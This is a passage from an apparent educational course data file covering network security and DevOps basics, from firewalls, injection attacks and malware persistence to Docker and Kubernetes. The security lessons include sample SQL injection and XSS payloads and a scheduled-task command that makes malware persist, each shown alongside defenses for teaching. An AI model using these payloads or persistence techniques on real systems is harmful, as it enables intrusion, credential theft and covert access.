    titleEn: "Firewalls, Zero Trust & Network Defense",
    pages: [
      {
        titleEn: "Firewall Types",
        contentEn: `**Firewall** = a security device that controls network traffic based on rules. It decides what goes in and what goes out.

**1. Stateless (Packet Filter)**
- Checks each packet individually against simple rules
- Rules based on: source IP, destination IP, port, protocol
- Fast but dumb — doesn't understand connections
- Example rule: "Block all traffic from IP 10.0.0.5 to port 22"

**2. Stateful**
- Tracks the **state** of connections (new, established, related)
- If you start a connection outbound, it allows the response back in
- Smarter — can detect packets that don't belong to a real connection
- Most traditional firewalls are stateful

**3. NGFW (Next-Generation Firewall)**
- Everything stateful does, plus:
- **Application awareness** — can identify apps (YouTube, Slack, BitTorrent) regardless of port
- **IPS** (Intrusion Prevention) — blocks known attack patterns
- **SSL inspection** — decrypts and inspects HTTPS traffic
- **User identity** — rules based on user/group, not just IP
- Examples: Palo Alto, Fortinet, Check Point

**Where firewalls sit:**
- Between internet and your network (perimeter)
- Between network segments (internal)
- On each computer (host-based: Windows Firewall, iptables)`
      },
      {
        titleEn: "DMZ Architecture",
        contentEn: `**DMZ** (Demilitarized Zone) = a network segment between the public internet and your private network.

**Architecture diagram:**

\`\`\`
Internet
    |
[Outer Firewall]     ← allows HTTP/HTTPS from internet
    |
  [DMZ]              ← web servers, email servers, DNS
    |
[Inner Firewall]     ← strict rules, limited access
    |
[Internal Network]   ← databases, file servers, workstations
\`\`\`

**Rules:**
- Internet → DMZ: allowed (specific ports only: 80, 443)
- DMZ → Internal: very limited (e.g., web server → database on port 3306 only)
- Internal → DMZ: allowed (for management)
- Internet → Internal: **blocked** (never direct access)

**What goes in the DMZ:**
- Web servers (public-facing)
- Email servers (MX records)
- DNS servers (public)
- VPN gateways
- Reverse proxies / load balancers

**Why DMZ matters:**
- If a web server is hacked, the attacker is stuck in the DMZ
- The inner firewall prevents access to the real data
- Without DMZ: hacked web server = direct access to database`
      },
      {},
      {
        titleEn: "Zero Trust (ZTNA)",
        contentEn: `**Zero Trust** = "Never trust, always verify." No user or device is trusted by default — even if they are inside the network.

**Traditional model (castle and moat):**
- Firewall protects the perimeter
- Once inside, you can access everything
- Problem: if attacker gets in, they move freely (lateral movement)

**Zero Trust principles:**
1. **Verify explicitly** — authenticate and authorize every request
2. **Least privilege** — give minimum access needed, for minimum time
3. **Assume breach** — design as if attackers are already inside

**How Zero Trust works:**
- **Identity** — strong authentication (MFA) for every access
- **Device** — check device health (updated? encrypted? managed?)
- **Network** — micro-segmentation (each app is isolated)
- **Application** — per-app access (not full network VPN)
- **Data** — classify and encrypt sensitive data
- **Monitoring** — continuous verification, not just at login

**Real-world example:**
- Old way: VPN → access entire corporate network
- Zero Trust: authenticate → verify device → access only the specific app you need → re-verify continuously

**Key technologies:** Identity Provider (Azure AD/Okta), MFA, micro-segmentation, ZTNA proxies (Zscaler, Cloudflare Access)`
      },
      {
        titleEn: "Story: Stuxnet — The First Cyber Weapon",
        contentEn: `In 2010, researchers discovered **Stuxnet** — a computer worm designed to physically destroy Iran's nuclear centrifuges.

**What Stuxnet did:**
- Targeted Siemens SCADA systems controlling uranium enrichment centrifuges
- Changed the speed of centrifuges (too fast, then too slow)
- While displaying **normal readings** to the operators
- Destroyed approximately **1,000 centrifuges** at Natanz facility

**How it spread:**
- Via **USB drives** (the facility was air-gapped — not connected to internet)
- Used **4 zero-day exploits** (unknown vulnerabilities) — extremely rare
- Only activated on systems with specific Siemens software + specific configuration
- Infected 200,000+ computers worldwide but only damaged the target

**Why it's historic:**
- First known **cyberweapon** designed to cause physical damage
- Attributed to USA and Israel (never officially confirmed)
- Changed warfare — showed that code can destroy physical infrastructure
- Led to the creation of US Cyber Command

**Defense lessons:**
- Air gaps are not enough (USB drives bypass them)
- Industrial control systems (ICS/SCADA) need security updates
- Supply chain attacks are real — inspect everything entering secure facilities
- Monitor for unusual behavior, not just known malware signatures`
      }
    ]
  },

  110: {
    titleEn: "SQL Injection & XSS Deep Dive",
    pages: [
      {
        titleEn: "SQL Injection Techniques",
        contentEn: `**Beyond basic SQLi — advanced techniques attackers use:**

**1. UNION-based SQLi**
- Combines results from two queries:
\`\`\`sql
' UNION SELECT username, password FROM users --
\`\`\`
- Attacker must match the number of columns in the original query
- Used to extract data from other tables

**2. Blind SQLi (Boolean-based)**
- The page doesn't show query results, but behaves differently for true/false
\`\`\`sql
' AND 1=1 --   (page loads normally → true)
' AND 1=2 --   (page shows error → false)
\`\`\`
- Attacker asks yes/no questions to extract data one bit at a time
- Example: "Is the first character of the admin password 'a'?"

**3. Time-based Blind SQLi**
- No visible difference in response. Attacker uses delays:
\`\`\`sql
' AND IF(1=1, SLEEP(5), 0) --
\`\`\`
- If response takes 5 seconds → condition is true
- Very slow but works when nothing else does

**Defenses (recap):**
- Parameterized queries / prepared statements — always #1
- ORM (Object-Relational Mapping) — abstracts SQL away
- Input validation + WAF as extra layers
- Regular security testing (SQLMap, Burp Scanner)`
      },
      {
        titleEn: "XSS Deep Dive",
        contentEn: `**Three types of XSS in detail:**

**1. Stored XSS (Persistent)**
- Malicious script is saved in the database
- Every user who views the page executes the script
- Most dangerous — affects many users automatically
- Example: attacker posts a comment containing \`<script>...\</script>\`

**2. Reflected XSS (Non-persistent)**
- Script is part of the URL/request
- Server includes the input in the response without sanitizing
- Attacker must trick the victim into clicking a crafted link
- Example: \`search.php?q=<script>alert(1)</script>\`

**3. DOM-based XSS**
- The vulnerability is in **client-side JavaScript**, not the server
- The server never sees the malicious input
- Example: JavaScript reads from \`location.hash\` and writes to \`innerHTML\`
\`\`\`javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.slice(1);
// Attack URL: page.html#<img src=x onerror=alert(1)>
\`\`\`

**XSS impact:**
- Steal session cookies → account takeover
- Redirect users to phishing pages
- Capture keystrokes (keylogger)
- Deface the website

**Defenses:**
- Output encoding (HTML entities, JavaScript encoding)
- Content Security Policy (CSP) header
- Use frameworks that auto-escape (React, Angular)
- \`HttpOnly\` flag on cookies (prevents JavaScript access)`
      }
    ]
  },

  111: {
    titleEn: "Authentication & Authorization",
    pages: [
      {
        titleEn: "Authentication vs Authorization",
        contentEn: `**Authentication (AuthN)** = verifying **who you are**
**Authorization (AuthZ)** = verifying **what you can do**

**Example:**
- You show your ID at the door → Authentication
- The guard checks if you can enter the VIP room → Authorization

**Authentication factors:**
- **Something you know** — password, PIN
- **Something you have** — phone (OTP), security key (YubiKey)
- **Something you are** — fingerprint, face scan

**MFA (Multi-Factor Authentication):**
- Uses 2+ factors from different categories
- Password + SMS code = MFA (know + have)
- Password + security question = NOT MFA (both are "know")

**Common authentication methods:**
- **Session-based** — server stores session, sends cookie to browser
- **Token-based (JWT)** — server sends signed token, client includes it in every request
- **OAuth 2.0** — "Login with Google/GitHub" — delegated authorization
- **SSO** — one login for multiple apps (Azure AD, Okta)

**Common mistakes:**
- Storing passwords in plain text (use hashing!)
- No account lockout after failed attempts
- Session tokens that never expire
- No MFA on admin accounts`
      },
      {
        titleEn: "Password Hashing",
        contentEn: `**Never store passwords in plain text.** Use hashing.

**Hashing** = one-way function that turns a password into a fixed-length string.
\`\`\`
"mypassword" → hash() → "5f4dcc3b5aa765d61d8327deb882cf99"
\`\`\`
You cannot reverse a hash back to the original password.

**Why plain hashing is not enough:**
- **Rainbow tables** — precomputed hashes for millions of common passwords
- If two users have the same password → same hash → attacker knows

**Salt** = random value added to each password before hashing:
\`\`\`
"mypassword" + "x7Kp9" → hash() → "a1b2c3..."  (user 1)
"mypassword" + "Qm3rZ" → hash() → "d4e5f6..."  (user 2)
\`\`\`
Same password, different salt → different hash. Rainbow tables become useless.

**Recommended algorithms:**
- **bcrypt** — most widely used, has built-in salt, adjustable cost factor
- **Argon2** — newest, winner of Password Hashing Competition (2015), memory-hard (resists GPU attacks)
- **scrypt** — memory-hard alternative to bcrypt

**Do NOT use:** MD5, SHA-1, SHA-256 for passwords (too fast → easy to brute force)`
      }
    ]
  },

  112: {
    titleEn: "HTTP Security Headers & CSRF Defense",
    pages: [
      {
        titleEn: "HTTP Security Headers",
        contentEn: `**Security headers** are HTTP response headers that tell the browser how to behave securely.

**Content-Security-Policy (CSP):**
- Controls which resources (scripts, styles, images) can load
- Prevents XSS by blocking inline scripts
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
\`\`\`
- Only scripts from your domain and cdn.example.com will run

**Strict-Transport-Security (HSTS):**
- Forces HTTPS — browser will never use HTTP for this domain
\`\`\`
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
\`\`\`
- Prevents SSL stripping attacks (MITM downgrades HTTPS to HTTP)

**X-Frame-Options:**
- Prevents your page from being loaded in an iframe
\`\`\`
X-Frame-Options: DENY
\`\`\`
- Defends against **clickjacking** (invisible iframe over a real page)

**Other important headers:**
- **X-Content-Type-Options: nosniff** — prevents MIME type sniffing
- **Referrer-Policy: strict-origin** — controls what URL info is sent to other sites
- **Permissions-Policy** — disables browser features (camera, microphone, geolocation)

**Check your headers:** Use securityheaders.com to scan your site (grade A-F)`
      },
      {
        titleEn: "CSRF Tokens & SameSite Cookies",
        contentEn: `**CSRF (Cross-Site Request Forgery)** — the browser sends your cookies automatically, even from a malicious site.

**Defense 1: CSRF Tokens**
- Server generates a random token for each session/form
- Token is included in every form as a hidden field
\`\`\`html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a1b2c3d4e5">
  <input name="amount" value="100">
  <button>Transfer</button>
</form>
\`\`\`
- Server checks: does the token match? If not → reject
- Attacker cannot guess the token → attack fails

**Defense 2: SameSite Cookies**
- Cookie attribute that controls when cookies are sent cross-site
\`\`\`
Set-Cookie: session=abc123; SameSite=Strict
\`\`\`

**SameSite values:**
- **Strict** — cookie is never sent cross-site (safest, but breaks some links)
- **Lax** — cookie sent on top-level navigation (GET only), not on POST/forms from other sites. **Default in modern browsers.**
- **None** — cookie always sent (must use Secure flag with HTTPS)

**Defense 3: Check Origin/Referer headers**
- Server checks where the request came from
- If origin doesn't match your domain → reject

**Best practice:** Use CSRF tokens + SameSite=Lax + check Origin header. Defense in depth.`
      }
    ]
  },

  113: {
    titleEn: "Threat Intelligence & OSINT",
    pages: [
      {
        titleEn: "Threat Intelligence Levels",
        contentEn: `**Threat Intelligence** = information about threats that helps you make security decisions.

**Three levels:**

**1. Tactical (Technical)**
- IOCs (Indicators of Compromise): malicious IPs, domains, file hashes
- Used by: SOC analysts, SIEM rules, firewall blocks
- Lifespan: hours to days (attackers change infrastructure often)
- Example: "Block IP 203.0.113.42 — it's a C2 server for Cobalt Strike"

**2. Operational**
- TTPs (Tactics, Techniques, and Procedures) — how attackers operate
- Used by: incident responders, threat hunters
- Lifespan: months (attackers reuse methods)
- Frameworks: **MITRE ATT&CK** — maps all known attacker techniques
- Example: "APT29 uses spear phishing with OAuth tokens to access cloud email"

**3. Strategic**
- High-level trends, geopolitical context, risk assessment
- Used by: CISO, board of directors, executives
- Lifespan: months to years
- Example: "Ransomware attacks on healthcare increased 94% this year. Budget for backup infrastructure."

**Threat Intelligence sources:**
- **Open source (OSINT)** — free: VirusTotal, AlienVault OTX, MITRE ATT&CK
- **Commercial** — paid feeds: Recorded Future, Mandiant, CrowdStrike
- **Government** — CISA alerts, FBI flash reports
- **ISACs** — industry-specific sharing (Financial ISAC, Health ISAC)`
      },
      {
        titleEn: "OSINT Tools & Techniques",
        contentEn: `**OSINT** (Open Source Intelligence) = gathering information from publicly available sources.

**Key tools:**

**Shodan** — "Search engine for the Internet of Things"
- Finds internet-connected devices: webcams, servers, routers, SCADA
- Search: \`port:3389 country:US\` → find open Remote Desktop servers in the US
- Useful for: finding exposed services your organization didn't know about

**Censys** — similar to Shodan, focused on certificates and web services
- Search by SSL certificate details, HTTP response headers
- Find all servers using a specific certificate or technology

**WHOIS / DNS tools**
- \`whois example.com\` — who registered the domain? When? Contact info?
- \`dig example.com\` — DNS records (A, MX, NS, TXT)
- **SecurityTrails** — historical DNS data (what did this domain point to last year?)

**Google Dorking** — advanced Google searches to find sensitive info:
- \`site:example.com filetype:pdf\` — find PDFs on a domain
- \`intitle:"index of" password\` — find exposed directories
- \`inurl:admin login\` — find admin login pages

**Other OSINT tools:**
- **theHarvester** — collect emails, subdomains, IPs from public sources
- **Maltego** — visual link analysis (connects people, domains, IPs)
- **Recon-ng** — modular recon framework (like Metasploit for OSINT)
- **Have I Been Pwned** — check if your email/password was leaked

**Ethics:** OSINT is legal (public data) but use it responsibly. Don't access systems you find — just report.`
      }
    ]
  },

  114: {
    titleEn: "Incident Response",
    pages: [
      {
        titleEn: "The 6 Phases of Incident Response (NIST)",
        contentEn: `When a security incident happens, you need a structured response. NIST defines 6 phases:

**1. Preparation**
- Build an IR team with clear roles
- Write playbooks for common incidents (ransomware, data breach, DDoS)
- Set up tools: SIEM, forensic workstations, communication channels
- Run tabletop exercises (simulate incidents)

**2. Identification**
- Detect and confirm the incident
- Sources: SIEM alerts, user reports, threat intelligence, anomaly detection
- Key questions: What happened? When? What systems are affected? Is it ongoing?
- Document everything with timestamps

**3. Containment**
- **Short-term:** isolate affected systems (disconnect from network, disable accounts)
- **Long-term:** apply temporary fixes while preparing for eradication
- Preserve evidence (disk images, memory dumps, logs) before making changes

**4. Eradication**
- Remove the threat completely (malware, backdoors, compromised accounts)
- Patch the vulnerability that was exploited
- Reset all potentially compromised credentials

**5. Recovery**
- Restore systems from clean backups
- Rebuild compromised systems from scratch (don't trust cleaned systems)
- Monitor closely for signs of re-infection
- Gradually bring systems back online

**6. Lessons Learned**
- Hold a post-incident review within 1-2 weeks
- What went well? What went wrong? What do we improve?
- Update playbooks, detection rules, and security controls
- Share findings with the team (and industry if appropriate)`
      },
      {
        titleEn: "Story: SolarWinds Supply Chain Attack (2020)",
        contentEn: `In December 2020, the cybersecurity firm FireEye discovered one of the most sophisticated attacks in history.

**What happened:**
- Hackers compromised **SolarWinds Orion** — a network monitoring tool used by 33,000+ organizations
- They inserted a backdoor (called **SUNBURST**) into a legitimate software update
- The infected update was signed with SolarWinds' real certificate
- 18,000 organizations installed the update — including the US government

**Who was affected:**
- US Treasury, Commerce, Homeland Security departments
- Microsoft, Intel, Cisco, Deloitte
- FireEye (who discovered the attack while investigating their own breach)

**How it worked:**
1. Attackers accessed SolarWinds' build system (where software is compiled)
2. Added malicious code to the Orion update (version 2019.4 - 2020.2.1)
3. The backdoor waited 2 weeks after install before activating (to avoid detection)
4. It communicated with C2 servers using DNS requests that looked like normal Orion traffic
5. Attackers selected high-value targets and moved deeper into their networks

**Attribution:** Russian intelligence (SVR) — group known as APT29 / Cozy Bear

**Impact:**
- Estimated cost: $100 billion+
- Led to a US Executive Order on improving national cybersecurity
- Changed how organizations think about supply chain security

**Lessons:**
- Trust no software blindly — even from trusted vendors
- Monitor outbound DNS and network traffic for anomalies
- Verify software integrity (build reproducibility, code signing reviews)
- Assume breach — have detection for post-compromise activity`
      }
    ]
  },

  115: {
    titleEn: "Malware & Persistence",
    pages: [
      {
        titleEn: "Malware Types",
        contentEn: `**Malware** = malicious software designed to harm, exploit, or steal.

**Types of malware:**

**Virus**
- Attaches to legitimate files/programs
- Spreads when the infected file is opened or shared
- Needs human action to spread (opening a file, running a program)

**Worm**
- Spreads by itself across networks — no human action needed
- Exploits vulnerabilities to move from system to system
- Example: WannaCry (2017) — used EternalBlue to spread via SMB, infected 230,000+ computers in 150 countries

**Trojan**
- Looks like legitimate software but contains malicious code
- User installs it willingly (fake antivirus, pirated game)
- Does not self-replicate — relies on deception

**Ransomware**
- Encrypts your files and demands payment (usually Bitcoin) for the decryption key
- Modern variants also steal data first (double extortion)
- Example: REvil demanded $70 million from Kaseya victims (2021)

**Rootkit**
- Hides deep in the operating system (kernel level)
- Makes itself and other malware invisible to antivirus
- Very difficult to detect and remove — often requires OS reinstall
- Can survive reboots and some can survive OS reinstall (firmware rootkits)

**Other types:**
- **Spyware** — monitors user activity (keylogger, screen capture)
- **Adware** — displays unwanted ads, tracks browsing
- **Botnet** — network of infected computers controlled by attacker (used for DDoS)`
      },
      {
        titleEn: "Persistence Mechanisms",
        contentEn: `**Persistence** = how malware survives a reboot and stays on the system.

Attackers need persistence to maintain access. Here are common techniques:

**1. Registry Run Keys (Windows)**
- Add entries to auto-start on boot:
\`\`\`
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
\`\`\`
- Easy to detect but still widely used

**2. Scheduled Tasks / Cron Jobs**
- Windows: \`schtasks /create /tn "Update" /tr malware.exe /sc onlogon\`
- Linux: add to \`/etc/crontab\` or user crontab
- Can run at specific times or on specific events

**3. Windows Services**
- Register malware as a Windows service → starts automatically
- Services run with SYSTEM privileges (highest level)
- Can be set to restart on failure

**4. Startup Folders**
- Drop a shortcut or script in:
\`\`\`
C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
\`\`\`

**5. DLL Hijacking / Side-Loading**
- Place a malicious DLL in a folder where a legitimate program searches first
- The program loads the malicious DLL instead of the real one

**6. WMI Event Subscriptions (Windows)**
- Advanced: trigger malware on specific system events
- Hard to detect — not visible in common startup locations

**Detection:**
- Use **Autoruns** (Sysinternals) — shows all auto-start locations
- Check scheduled tasks and services regularly
- Monitor registry changes with SIEM
- Use EDR (Endpoint Detection and Response) tools for real-time monitoring`
      }
    ]
  },

  // ========== DEVOPS TRACK (201-209) ==========
201: {
    titleEn: "Linux Fundamentals",
    pages: [
      {
        titleEn: "The Filesystem Hierarchy (FHS)",
        contentEn: `Linux organizes everything in a single tree that starts at /.

**Key directories:**
- **/bin** — essential commands (ls, cp, cat)
- **/etc** — configuration files (like the "settings folder")
- **/home** — each user gets a folder here (/home/alice)
- **/var** — variable data: logs, databases, mail
- **/tmp** — temporary files (cleared on reboot)
- **/usr** — user programs and libraries
- **/dev** — device files (disks, terminals)
- **/proc** — virtual filesystem showing running processes

**The big idea:** In Linux, everything is a file.
A hard disk? A file (/dev/sda).
A running process? A folder (/proc/1234).
A network socket? Also a file.

This is very different from Windows, where drives have letters (C:\\, D:\\) and settings live in the Registry.`
      },
      {
        titleEn: "Essential Linux Commands",
        contentEn: `Every DevOps engineer uses these commands daily.

**System monitoring:**
- **top** / **htop** — see CPU and memory usage live
- **df -h** — show disk space ("disk free, human-readable")
- **free -h** — show RAM usage

**Network:**
- **ss -tulnp** — show open ports and which process uses them
- **curl** — make HTTP requests from the terminal

**Logs and debugging:**
- **journalctl -u nginx** — read logs for a specific service
- **journalctl -f** — follow logs in real time (like a live stream)
- **lsof -i :8080** — find which process uses port 8080

**File operations:**
- **grep -r "error" /var/log/** — search for "error" in all log files
- **tail -f /var/log/syslog** — watch a log file live
- **find / -name "*.conf"** — find all config files

> A good DevOps engineer does not guess. They check logs first.`
      },
      {
        titleEn: "Permissions: chmod and chown",
        contentEn: `Linux controls who can read, write, or run each file.

**Three permission groups:**
- **Owner** — the user who created the file
- **Group** — a team of users
- **Others** — everyone else

**Three permission types:**
- **r** (read = 4) — can open and read
- **w** (write = 2) — can change or delete
- **x** (execute = 1) — can run as a program

**Reading permissions:**
\`-rwxr-xr--\` means:
- Owner: rwx (read + write + execute = 7)
- Group: r-x (read + execute = 5)
- Others: r-- (read only = 4)

**Commands:**
- \`chmod 755 script.sh\` — owner can do all, others can read and run
- \`chmod 600 secret.key\` — only owner can read and write
- \`chown alice:devteam file.txt\` — change owner to alice, group to devteam

{question}
A file has permissions \`-rw-r-----\`. Who can read it?
a) Everyone on the system
b) Only the owner and the group
c) Only the owner
d) Nobody

answer: b
explanation: Owner has rw- (read+write), Group has r-- (read only), Others have --- (no access).`
      },
      {
        titleEn: "systemd: Managing Services",
        contentEn: `systemd is the boss of all processes on modern Linux.

**What is a service?**
A program that runs in the background. Examples: a web server (nginx), a database (postgres), your own app.

**Essential commands:**
- \`systemctl start nginx\` — start the service
- \`systemctl stop nginx\` — stop the service
- \`systemctl restart nginx\` — stop then start
- \`systemctl status nginx\` — is it running? any errors?
- \`systemctl enable nginx\` — start automatically on boot
- \`systemctl disable nginx\` — do not start on boot

**Creating your own service:**
\`\`\`ini
# /etc/systemd/system/myapp.service
[Unit]
Description=My Application
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/myapp/server.py
Restart=always
User=appuser

[Install]
WantedBy=multi-user.target
\`\`\`

**Key idea:** \`Restart=always\` means if your app crashes, systemd will restart it automatically. This is self-healing at the OS level.

{simulation}
Your web app is not responding. Walk through the debugging steps:
1. \`systemctl status myapp\` — is the service running?
2. \`journalctl -u myapp -n 50\` — what do the last 50 log lines say?
3. \`ss -tulnp | grep 8080\` — is something blocking the port?
4. \`df -h\` — is the disk full?
5. \`free -h\` — is the system out of memory?`
      }
    ]
  },

  202: {
    titleEn: "Containers & Docker",
    pages: [
      {
        titleEn: "VMs vs Containers",
        contentEn: `Both VMs and containers isolate applications, but in very different ways.

**Virtual Machine (VM):**
- Runs a full operating system inside your OS
- Has its own kernel, drivers, and libraries
- Heavyweight: takes minutes to start, uses GBs of RAM
- Example: VirtualBox, VMware, EC2 instances

**Container:**
- Shares the host OS kernel
- Only packs the app + its dependencies
- Lightweight: starts in seconds, uses MBs of RAM
- Example: Docker containers

**Analogy:**
- A VM is like renting an entire apartment (your own kitchen, bathroom, walls)
- A container is like a co-working desk (shared building, your own space)

**Why containers won:**
- 10x faster startup
- 10x less disk and memory usage
- Easy to move between machines (works on my laptop = works on the server)
- Perfect for microservices (one container per service)

| Feature | VM | Container |
|---|---|---|
| Startup time | Minutes | Seconds |
| Size | GBs | MBs |
| Isolation | Full OS | Process-level |
| Performance | Some overhead | Near-native |`
      },
      {
        titleEn: "Dockerfile: Building Images",
        contentEn: `A Dockerfile is a recipe that tells Docker how to build an image.

**Key instructions:**
- **FROM** — the base image to start from
- **RUN** — execute a command during build
- **COPY** — copy files from your machine into the image
- **CMD** — the default command when the container starts
- **EXPOSE** — document which port the app uses
- **ENV** — set environment variables

**Example:**
\`\`\`dockerfile
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]
\`\`\`

**How layers work:**
Each instruction creates a layer. Docker caches layers.
If you change your code but not package.json, Docker skips the \`npm install\` layer. This makes builds fast.

**Layer order matters:**
- Put things that change rarely at the top (FROM, package.json)
- Put things that change often at the bottom (COPY source code)

**Build and run:**
\`\`\`bash
docker build -t myapp:1.0 .
docker run -p 3000:3000 myapp:1.0
\`\`\`

{question}
Why do we COPY package.json before COPY . (the full source)?
a) It does not matter, the order is random
b) So Docker can cache the npm install layer when only code changes
c) Because package.json must be copied first by law
d) To make the image smaller

answer: b
explanation: Docker caches each layer. If package.json did not change, the RUN npm install layer is reused. This saves minutes on every build.`
      },
      {
        titleEn: "Docker Compose: Multi-Container Apps",
        contentEn: `Most real apps need more than one container. Docker Compose manages them all.

**Example: web app + database + cache**
\`\`\`yaml
# docker-compose.yml
version: "3.8"
services:
  web:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DB_HOST=db
      - REDIS_HOST=cache
    depends_on:
      - db
      - cache

  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: secret
    volumes:
      - pgdata:/var/lib/postgresql/data

  cache:
    image: redis:7-alpine

volumes:
  pgdata:
\`\`\`

**Key concepts:**
- **services** — each service is one container
- **depends_on** — start db and cache before web
- **volumes** — pgdata keeps database files safe even if the container is deleted
- **environment** — pass config without hardcoding

**Commands:**
- \`docker compose up -d\` — start all services in background
- \`docker compose down\` — stop and remove all containers
- \`docker compose logs -f web\` — follow logs of the web service
- \`docker compose ps\` — list running services

**Why Compose matters:** One command to start your entire application stack. New developer? Clone the repo, run \`docker compose up\`, done.`
      },
      {
        titleEn: "Docker Networking",
        contentEn: `Containers need to talk to each other and to the outside world. Docker provides three network types.

**Bridge (default):**
- Containers on the same bridge network can reach each other by name
- Isolated from the host and from other networks
- Best for: single-machine apps, development

**Host:**
- Container shares the host's network directly
- No port mapping needed (the container IS the host, network-wise)
- Best for: maximum performance, monitoring tools

**Overlay:**
- Connects containers across multiple machines
- Used in Docker Swarm and Kubernetes
- Best for: production clusters

**How containers find each other:**
\`\`\`yaml
# In docker-compose.yml, services talk by name:
web:
  environment:
    - DB_HOST=db    # "db" resolves to the db container's IP
\`\`\`

Docker runs its own internal DNS. When the web container asks for "db", Docker returns the IP of the database container.

{thinkOutside}
You have three microservices: API, Worker, and Database.
- The API must be reachable from the internet (port 8080)
- The Worker processes background jobs and talks to the Database
- The Database must NOT be reachable from the internet

How would you design the Docker networks?

Hint: You can create multiple networks. A container can join more than one network.

Possible solution:
- Network "frontend": API container (exposed port 8080)
- Network "backend": API + Worker + Database
- The API is on both networks. The Database is only on "backend", so the internet cannot reach it directly.`
      }
    ]
  },

  203: {
    titleEn: "Kubernetes (K8s) Basics",
    pages: [
      {
        titleEn: "Core K8s Objects",
        contentEn: `Kubernetes manages containers at scale. It uses objects to describe what you want.

**Pod:**
- The smallest unit in K8s
- Contains one or more containers that share storage and network
- Usually: one main container per Pod
- Pods are temporary — they can be killed and recreated

**Deployment:**
- Manages a set of identical Pods
- You say "I want 3 copies", K8s keeps 3 running at all times
- Handles rolling updates: replace old version with new, one by one

**Service:**
- A stable network address for a group of Pods
- Pods change IPs when they restart. A Service gives them a fixed name.
- Types: ClusterIP (internal), NodePort (external port), LoadBalancer (cloud LB)

**ConfigMap:**
- Stores configuration as key-value pairs
- Keeps config outside your container image
- Example: database URL, feature flags

**Secret:**
- Like ConfigMap but for sensitive data
- Base64 encoded (not encrypted by default!)
- Example: passwords, API keys, TLS certificates

**Mental model:** A Deployment creates Pods. A Service gives them a stable address. ConfigMaps and Secrets feed them configuration.`
      },
      {
        titleEn: "YAML & kubectl",
        contentEn: `You describe your desired state in YAML files. K8s makes it happen.

**Example Deployment:**
\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
        - name: web
          image: myapp:2.0
          ports:
            - containerPort: 3000
          resources:
            requests:
              memory: "128Mi"
              cpu: "250m"
            limits:
              memory: "256Mi"
              cpu: "500m"
\`\`\`

**Essential kubectl commands:**
- \`kubectl apply -f deploy.yaml\` — create or update resources
- \`kubectl get pods\` — list all pods
- \`kubectl describe pod web-app-xyz\` — detailed info about a pod
- \`kubectl logs web-app-xyz\` — read pod logs
- \`kubectl exec -it web-app-xyz -- /bin/sh\` — open a shell inside a pod
- \`kubectl delete -f deploy.yaml\` — remove resources

**Declarative vs Imperative:**
- Imperative: "Create 3 pods now" (like giving step-by-step orders)
- Declarative: "I want 3 pods" (K8s figures out how to get there)
- K8s is declarative. You describe the end state, not the steps.

{question}
A Deployment has replicas: 3 and one pod crashes. What happens?
a) The app goes down until you manually fix it
b) K8s automatically creates a new pod to replace it
c) K8s shuts down the other 2 pods
d) Nothing, you need to run kubectl restart

answer: b
explanation: The Deployment controller always works to match the desired state (3 replicas). If a pod dies, it creates a new one.`
      },
      {
        titleEn: "Horizontal Pod Autoscaler (HPA)",
        contentEn: `HPA automatically adjusts the number of pods based on load.

**How it works:**
1. You define: "keep CPU usage around 50%"
2. HPA checks metrics every 15 seconds
3. If average CPU > 50% → add more pods
4. If average CPU < 50% → remove extra pods

**Example:**
\`\`\`yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: web-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: web-app
  minReplicas: 2
  maxReplicas: 10
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 50
\`\`\`

**Key settings:**
- **minReplicas: 2** — never go below 2 (high availability)
- **maxReplicas: 10** — never go above 10 (cost control)
- **averageUtilization: 50** — target 50% CPU usage

**Scale-up vs scale-down:**
- Scale-up is fast (seconds) — respond to traffic spikes quickly
- Scale-down is slow (5 minutes default) — avoid flapping

**Real example:**
Normal load → 2 pods at 30% CPU.
Black Friday sale → CPU jumps to 80%.
HPA scales to 5 pods → CPU drops to 32%.
Sale ends → HPA slowly scales back to 2 pods.

This is why cloud-native apps can handle traffic spikes without human intervention.`
      },
      {
        titleEn: "K8s Networking",
        contentEn: `Kubernetes networking has three layers: pod-to-pod, services, and external access.

**CNI (Container Network Interface):**
- A plugin that gives each pod its own IP address
- Popular choices: Calico, Flannel, Cilium
- Rule: every pod can talk to every other pod (by default)

**CoreDNS:**
- The internal DNS server of K8s
- Lets pods find services by name
- \`my-service.my-namespace.svc.cluster.local\` → the service IP
- Short form works too: just \`my-service\` within the same namespace

**Service types:**
- **ClusterIP** — internal only (default). Other pods can reach it.
- **NodePort** — opens a port (30000-32767) on every node
- **LoadBalancer** — creates a cloud load balancer (AWS ALB, GCP LB)

**Ingress:**
- Routes external HTTP traffic to internal services
- Acts like a smart reverse proxy
- Can route by path: /api → api-service, /web → web-service
- Can route by domain: api.myapp.com → api-service
- Handles TLS/SSL termination

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: my-ingress
spec:
  rules:
    - host: myapp.com
      http:
        paths:
          - path: /api
            pathType: Prefix
            backend:
              service:
                name: api-service
                port:
                  number: 8080
\`\`\`

{simulation}
Trace a user request through K8s networking:
1. User types myapp.com/api/users in browser
2. DNS resolves myapp.com to the cloud load balancer IP
3. Load balancer sends traffic to a K8s node
4. Ingress controller sees /api and routes to api-service
5. api-service (ClusterIP) picks one of 3 healthy pods
6. The pod processes the request and returns a response
7. The response travels back the same path`
      }
    ]
  },

  204: {
    titleEn: "Cloud Computing",
    pages: [
      {
